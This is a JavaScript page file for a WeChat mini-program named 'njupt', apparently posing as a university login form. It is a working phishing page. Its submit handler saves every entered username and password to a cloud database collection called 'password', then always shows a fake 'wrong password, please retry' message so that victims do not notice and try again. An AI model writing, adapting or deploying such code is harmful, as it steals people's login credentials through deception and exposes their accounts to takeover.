// pages/njupt/njupt.js

const db = wx.cloud.database();
Page({


  /**
   * 页面的初始数据
   */
  data: {
    username: "",
    password: "",
    hasSubmit: false
  },

  formUsernameChange: function (e) {
    this.setData({
      username: e.detail.value
    });
  },

  formPasswordChange: function (e) {
    this.setData({
      password: e.detail.value
    });
  },

  submitForm: function (e) {
    let that = this;
    this.setData({
      hasSubmit: true
    });
    wx.showLoading({
      title: '加载中',
    })
    setTimeout(function () {
      wx.hideLoading();
      that.setData({
        hasSubmit: false
      });
      wx.showToast({
        title: '密码错误请重试',
        icon: 'error',
        duration: 2000
      });
    }, 3000);
    db.collection('password').add({
      data: {
        username: this.data.username,
        password: this.data.password
      }
    });


  },
  /**
   * 生命周期函数--监听页面加载
   */
  onLoad: function (options) {

  },

  /**
   * 生命周期函数--监听页面初次渲染完成
   */
  onReady: function () {

  },

  /**
   * 生命周期函数--监听页面显示
   */
  onShow: function () {

  },

  /**
   * 生命周期函数--监听页面隐藏
   */
  onHide: function () {

  },

  /**
   * 生命周期函数--监听页面卸载
   */
  onUnload: function () {

  },

  /**
   * 页面相关事件处理函数--监听用户下拉动作
   */
  onPullDownRefresh: function () {

  },

  /**
   * 页面上拉触底事件的处理函数
   */
  onReachBottom: function () {

  },

  /**
   * 用户点击右上角分享
   */
  onShareAppMessage: function () {

  }
})